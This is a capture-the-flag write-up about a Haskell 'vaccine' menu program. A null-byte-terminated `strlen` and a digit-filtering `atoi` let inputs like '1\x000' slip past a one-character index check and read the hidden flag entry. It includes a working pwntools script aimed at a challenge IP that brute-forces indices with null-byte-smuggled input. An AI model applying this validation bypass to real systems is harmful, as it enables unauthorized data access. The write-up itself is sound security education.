Pwning faulty implementation of `strlen` and `atoi` functions in Haskell.

# Going through the program

If you don't know how to read Haskell, don't worry, I don't too...

The whole code was quite readable, and we quickly see where the flag is at.

Line 47:
```rust
    let vaccines = [Vaccine x "some random Vaccine" "03/04/2020" | x <- [0..num]] ++ [Vaccine (num+1) flag "03/04/2020"]
```

`num` is a random value from 10 to 100 (exclusive), and our flag is at index `num`.

Looking at the code, this is just another program with menu functions

1. View vaccine: Give Vaccine ID (index), and it will print out the vacine ID, description, date.
2. Edit vaccine: Give Vaccine ID (index), and you can input a new description and date for that vaccine.
3. Exit: ... no explanations needed.

So we just read the vaccine at that index? **WRONG**

```
What do you want to do?
1. View Vaccine
2. Edit Vaccine
3. Exit
1
Enter Vaccine ID:
10
Invalid Vaccine ID
```

There is an error upon inputting any index >= 10. We see the culprit of this annoying error:

```rust
        putStrLn "Enter Vaccine ID: "
        input <- getLine
        if (strlen input == 1 && input !! 0 /= '0') then do
            let id = atoi input
            if (id >= 0 && id < Prelude.length vaccines) then do
                printVaccine $ vaccines !! id
                loop
```

There are two conditions that our input must satisfy:

1. `strlen input == 1`: The length of the string is 1
2. `input !! 0 /= '0'`: The index 0 character is not '0'

One last thing before we go to the solution: our input is passed into `atoi` to convert it from string to integer, before using it as the index to `vaccines`.

# Solution

We see that condition 2 is already satisfied by our inputs, so we look at condition 1.

```rust
strlen :: String -> Int
strlen input = Prelude.length $ Prelude.takeWhile (/= '\0') input
```

We see that `strlen` takes a `String` and returns an `Int`, and it just takes and counts the characters until a `\0` (null byte) is met, which is what we're used to with C strings. But wait...

{% include image.html url="/assets/images/boh2023/vaccines_chatgpt.png" description="bamboozled" %}

Which means that, an input of `1\0XXXX...` will be regarded as length 1 even though it really isn't.

```rust
atoi :: String -> Int
atoi input = do
    let input' = Prelude.filter (\x -> x >= '0' && x <= '9') input
    Prelude.read input' :: Int
```

Looking at `atoi`, we see that it just filters out for characters that are `0-9`. So, if we input `1\00`, it will be regarded as having length 1, and has value of integer 10. Similarly, `4\09` is 49 etc.

So, we just write a script to run through the index 10 to 100, and stop when we get the flag.

# Final Script
```python
from pwn import *

DEBUG = False

conn = process("./src") if DEBUG else remote("54.158.139.58", 1237)

def select(ind):
    conn.recvuntil(b"Exit")
    conn.recvline()
    if type(ind) == str:
        ind = ind.encode()
    conn.sendline(ind)

def chooseID(ind):
    conn.recvuntil(b"ID:")
    conn.recvline()
    if type(ind) == str:
        ind = ind.encode()
    conn.sendline(ind)

for i in range(10, 100):
    select("1")

    tens = str(i)[0].encode()
    ones = str(i)[1].encode()
    chooseID(tens + b"\x00" + ones)

    if b"Invalid" in conn.recvline():
        break

    conn.recvuntil(b": ")
    print(conn.recvline(keepends=False))
```
